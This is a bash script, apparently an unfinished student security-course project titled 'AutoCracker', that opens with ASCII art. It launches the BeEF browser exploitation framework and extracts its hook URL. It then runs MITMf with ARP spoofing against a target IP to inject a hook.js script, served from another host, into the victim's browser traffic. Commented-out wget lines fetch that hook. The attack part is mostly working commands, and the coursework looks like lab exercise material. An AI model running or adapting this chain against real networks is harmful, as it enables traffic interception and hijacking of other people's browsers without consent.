#!/bin/bash
printf "%q\n" "                                                                                             "     
printf "%q\n" "                                                                                             "     
printf "%q\n" "                                                                         ^^.....-+.         "     
printf "%q\n" "                                                                   ^....^^.~-_+_         "     
printf "%q\n" "                                                              ^...^.~-+==i=+_          "     
printf "%q\n" "                                                         ^...^.-+===+-.             "     
printf "%q\n" "                                                    ^..^  .-+ii=+-^                    "     
printf "%q\n" "                                               ^^.^.-+=ii=~                         "     
printf "%q\n" "                                          ^^^^._+iii=_.                             "     
printf "%q\n" "                                     ^^^^  ^-+iii+-^                                  "     
printf "%q\n" "                                ...^     ._=ii+-^                                      "     
printf "%q\n" "                            ...^      -=ii=~                                         "     
printf "%q\n" "                        .~~^        _=ii+-^                                             "     
printf "%q\n" "                     .~~^       ^~+=+-^                                                "     
printf "%q\n" "                   .~.^^-+=+_-=o*+-                                                   "     
printf "%q\n" "                ^~~^^-i!!e***!!e***_                                                    "     
printf "%q\n" "              .-~.^^^^^^~o*=~^  ~oi                                                    "     
printf "%q\n" "            .-~...o!!o+o.                                                                  "     
printf "%q\n" "          --~~.~oei_.          ooooo                                                     "     
printf "%q\n" "          _---~~o+~           oooooooo                                                    "      
printf "%q\n" "         _-                  ooooooooooo                                                  "                
printf "%q\n" "          _++-               oooooooooooo                                                 "                 
printf "%q\n" "         ._i+_-             oooooooooooo                                                 "                 
printf "%q\n" "         +.~                 oooooooooooo                                                 "                 
printf "%q\n" "          _=_-~..            oooooooooo                                                  "               
printf "%q\n" "           _oi+-~.^^^^^^       oooooo                                                    "           
printf "%q\n" "            ^+*o=_-~~.^^^          ^^                                                     "     
printf "%q\n" "              ^ooi=_-~~^^     ^~~~_^                                                    "     
printf "%q\n" "                 -=ooi=_-~.^^^^^^^^^..~                                                    "     
printf "%q\n" "                   _iooi=+--~~..~~...^~_                                                  "     
printf "%q\n" "                      ^_i**oi=_-----~~.^~-~^                                               "     
printf "%q\n" "                         -+o**o==__--~~~..~--.                                           "     
printf "%q\n" "                              ^-io**i=+_---~~~..-_-.                                      "      
printf "%q\n" "                                   ^-+i*e*i=+_--~~..~-_-.                                  "      
printf "%q\n" "                                       ._+o*ee*i++--~..~-__-.                             "      
printf "%q\n" "                                             ^~=o*eeo==+_-~~~-_-.^                        "      
printf "%q\n" "                                                  ._+o*ee*ii=+-~~--___-~^                 "      
printf "%q\n" "                                                        ^-i**e**i==+-~~--____--~.^        "      
printf "%q\n" "                                                             ^-i**ee*oi=++_----_o.       "      
printf "%q\n" "                                                                   ._io*eeee*oii=oo        "      
printf "%q\n" "                                                                          ^.~_+++.        "      

echo "^"
echo "|"
echo "|_ Thats supposed to be a nutcracker:)"
echo "000000000000000000000000000000000000000000000000000000000000000000000000000000	"
echo "000 _____0000000000__0000000000000000000000000000000000000__000000000000000000"
echo "000/  _  \  __ ___/  |_  ____   ________________    ____ |  | __ ___________ 0"
echo "00/  /_\  \|  |  \   __\/  _ \_/ ___\_  __ \____\00/ ___\|  |/ // __ \_  __ \0  "
echo "0/    |    \  |  /|  |0(  ( ) )  \___|  |0\//____\\  \___|    <  \ ___/ | | \/0 "
echo "0\____|__  /____/0|__|00\____/ \___  >__|00(______/\_____>__|_ \ \___> | |0000  "
echo "000000000\/000000000000000000000000\/00000000000\/00000\/00000\/0000000\/00000   "   								"																
#working title:)/ ascii art title
#PS thats a nut cracker
				
#working title:)
#PS thats a nut cracker 								"																
#working title:)


#feel free to prettify any of this:)
# This tool will...(help me out here folks :) )
echo "CS378 AutoCracker CSRFF Final Project(AKA The Cracker)"
echo "By Dillon Cuthrell, Anthony Nguyen, Midora DuBose"
echo "Type website here:"

read s

b=""
if [ -n s  ] ;
then
#eval beef
echo "you typed:"
#"/n?"
#start beef
#eval $command
#maybe$()?
echo "$s"



echo "beef"
cd /usr/share/beef-xss; ./beef > /root/Desktop/boutput.txt

#parse obutput.txt
r=Hook 
wait
cat /root/Desktop/boutput.txt | while read i
do 
if [ ! "${i/$r}" = "$i" ] ; then
#the second echo is our hook url
echo "$i"
fi 
done

#here we would pass our site/target to mitmf
mitmf --spoof --arp -i wlan0 --gateway 10.0.2.1 --target 10.0.2.236 --inject --js-url http://10.0.2.15:3000/hook.js > /root/Desktop/moutput.txt

#possibly we parse the output of moutput.txt?

#possibly some wgets?
#wget
#wget "http://127.0.0.1:3000/hook.js"
#wget "http://www.google.com"
#echo "end beef, hook downloaded"

#XSS occurs here?

fi


echo "autocracker done"
#do stuff
